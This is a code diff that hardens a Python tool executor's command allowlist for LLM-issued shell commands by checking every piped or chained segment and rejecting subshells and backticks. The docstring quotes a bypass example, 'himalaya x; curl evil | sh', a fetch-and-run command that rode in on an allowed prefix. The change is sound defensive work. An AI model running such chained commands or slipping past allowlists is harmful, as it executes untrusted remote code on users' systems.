@@ -5,6 +5,7 @@ from __future__ import annotations
 import asyncio
 import json
 import os
+import shlex
 import shutil
 import sys
 from pathlib import Path
@@ -77,6 +78,50 @@ class ToolExecutor:
             return command
         return command.replace("/app/tools/", f"{local_tools_dir}/")
 
+    # Shell operators that separate one command from the next. A run_command
+    # string may legitimately pipe between allowlisted tools (`himalaya … | jq …`),
+    # so these can't be banned outright — but every resulting segment must itself
+    # start with an allowlisted prefix.
+    _SEGMENT_OPS = frozenset({"|", "||", "&&", ";", "&", "\n"})
+
+    def _command_allowed(self, command: str) -> bool:
+        """True if EVERY pipeline/sequence segment starts with an allowlisted prefix.
+
+        A first-token-only check let a chained tail ride in on an allowed head
+        (`himalaya x; curl evil | sh` starts with `himalaya`, so it passed). This
+        splits the command quote-aware via shlex: a pipe inside quotes — like
+        `jq '.a | .b'` — stays one segment, while a real `himalaya … | jq …` splits
+        into two, each checked. Subshells and command substitution (`(`, `)`, `$(…)`,
+        backticks) are rejected outright: they run an inner command the prefix check
+        would never see. Last-line hard gate for LLM-issued commands only;
+        ``run_command_trusted`` (agent-built strings) bypasses it.
+        """
+        try:
+            lex = shlex.shlex(command, posix=True, punctuation_chars=True)
+            lex.whitespace_split = True
+            tokens = list(lex)
+        except ValueError:
+            return False  # unbalanced quotes etc. — refuse rather than guess
+        if not tokens:
+            return False
+        segment: list[str] = []
+        segments = [segment]
+        for tok in tokens:
+            if tok in self._SEGMENT_OPS:
+                segment = []
+                segments.append(segment)
+            elif tok in ("(", ")") or "`" in tok:
+                return False  # subshell / command substitution
+            else:
+                segment.append(tok)
+        for segment in segments:
+            if not segment:
+                continue
+            joined = " ".join(segment)
+            if not any(joined.startswith(p) for p in self.ALLOWED_PREFIXES):
+                return False
+        return True
+
     async def run_command(
         self, command: str, timeout: int = 30, tool_env: dict[str, str] | None = None
     ) -> dict:
@@ -87,9 +132,13 @@ class ToolExecutor:
         browser profile) so each agent authenticates as itself (#93).
         """
         # Security: validate against whitelist
-        if not any(command.startswith(p) for p in self.ALLOWED_PREFIXES):
+        if not self._command_allowed(command):
             return {
-                "error": f"Command not allowed. Must start with one of: {self.ALLOWED_PREFIXES}"
+                "error": (
+                    "Command not allowed. Every piped/chained segment must start with one "
+                    f"of: {self.ALLOWED_PREFIXES}. Subshells, command substitution and "
+                    "backticks are rejected."
+                )
             }
         # `browser.py explore` runs an inner LLM loop (many page steps) and needs
         # minutes, not the 30s default — otherwise it's always killed mid-booking.
